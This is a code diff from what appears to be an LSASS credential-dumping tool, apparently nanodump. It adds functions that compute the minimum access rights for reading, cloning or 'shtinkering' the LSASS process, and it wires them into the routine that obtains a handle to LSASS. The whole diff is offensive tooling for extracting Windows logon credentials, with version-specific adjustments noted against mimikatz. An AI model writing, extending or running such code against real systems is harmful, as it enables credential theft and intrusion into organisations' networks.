@@ -366,6 +366,38 @@ cleanup:
 
 #if defined(NANO)
 
+// get the minimum permissions required to read LSASS
+DWORD get_lsass_min_permissions(VOID)
+{
+    PVOID pPeb;
+    PULONG32 OSMajorVersion;
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    // NOTE: mimikatz uses < instead of <= but this doesn't seem to work in Windows Server 2008 R2
+    return PROCESS_VM_READ | ((*OSMajorVersion <= 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+}
+
+// get the minimum permissions required to clone LSASS
+DWORD get_lsass_clone_permissions(VOID)
+{
+    PVOID pPeb;
+    PULONG32 OSMajorVersion;
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    return PROCESS_CREATE_PROCESS | ((*OSMajorVersion <= 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+}
+
+// get the minimum permissions required to dump LSASS via shtinkering
+DWORD get_lsass_shtinkering_permissions(VOID)
+{
+    PVOID pPeb;
+    PULONG32 OSMajorVersion;
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    // NOTE: mimikatz uses < instead of <= but this doesn't seem to work in Windows Server 2008 R2
+    return PROCESS_VM_READ | ((*OSMajorVersion <= 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+}
+
 // get a handle to LSASS via multiple methods
 BOOL obtain_lsass_handle(
     OUT PHANDLE phProcess,
@@ -390,7 +422,7 @@ BOOL obtain_lsass_handle(
     BOOL   ret_val               = FALSE;
     BOOL   success               = FALSE;
     HANDLE hProcess              = NULL;
-    DWORD  permissions           = LSASS_DEFAULT_PERMISSIONS;
+    DWORD  permissions           = get_lsass_min_permissions();
     DWORD  duplicate_permissions = 0;
     DWORD  attributes            = 0;
     BOOL   use_seclogon_leak     = use_seclogon_leak_local || use_seclogon_leak_remote;
@@ -433,15 +465,16 @@ BOOL obtain_lsass_handle(
     if (use_lsass_shtinkering)
         attributes |= OBJ_INHERIT;
 
-    // fork and snapshot require LSASS_CLONE_PERMISSIONS
+    // fork and snapshot require special permissions
     if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak)
     {
-        permissions = LSASS_CLONE_PERMISSIONS;
+        permissions = get_lsass_clone_permissions();
     }
-    // shtinkering requires LSASS_SHTINKERING_PERMISSIONS
+
+    // shtinkering requires special permissions
     else if (use_lsass_shtinkering)
     {
-        permissions = LSASS_SHTINKERING_PERMISSIONS;
+        permissions = get_lsass_shtinkering_permissions();
     }
 
     // remember the permissions we needed
